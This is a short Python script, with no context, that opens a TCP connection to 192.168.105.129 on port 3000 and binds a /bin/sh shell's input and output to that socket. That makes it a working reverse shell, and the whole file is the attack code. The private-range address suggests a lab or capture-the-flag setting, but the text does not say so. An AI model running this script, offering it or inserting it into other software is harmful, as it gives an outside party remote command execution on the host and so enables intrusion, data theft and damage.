import subprocess
import socket
s=socket.socket()
s.connect(("192.168.105.129",3000))
subprocess.run(["/bin/sh"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())